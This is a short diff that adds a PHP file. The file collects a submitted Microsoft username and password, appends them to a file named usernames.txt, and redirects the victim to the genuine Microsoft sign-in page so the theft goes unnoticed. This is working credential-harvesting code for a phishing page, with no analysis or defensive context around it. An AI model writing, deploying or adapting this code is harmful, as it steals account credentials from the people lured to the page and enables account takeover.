@@ -1,0 +1,6 @@
+<?php
+
+file_put_contents("../userpass/usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+header('Location: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=46e00e6b-5439-4423-84ab-d50ccd44dfb3&x-client-SKU=MSAL.Desktop&x-client-Ver=4.61.3.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBu3aCMAAA0H9xZcAQOCWDQzCSIsizWO1GEBIDAvIUvr737vBnBKMfX4WP5Kn42Pdrq3zb1Ismn7qbXnXFeRkvfM-Fa3jK29sjF8Ixoe_0eDvLtdprDmIzR1vhtgGSlMgXzxWFuSaXAPvkJOtQk0FyIY_EIn5R9VsX5WaFuGLVRt7Aah_cVQtkdgp_JNYd03uIZFb1M878Y6ht3ob5wh7-RsP08sTQhw4wT13mhNkkcqhda6EnxsvWQ_wbrVTtcV0fh7rsSMCtWNHfCy7ZjbAm7pAwA7E-e-0jIu6VaE5UY2IFpIMCKCyN29g-0zDJvsoY3DQVVAFqntbFoTFpj7NH_0AHs1ST0_Bg9ciMmqxkFH3knbjlmo3xsfh9qM5zuRwOu38HM9-fWgEAAA&msaoauth2=true&lc=1046');
+exit();
+?>
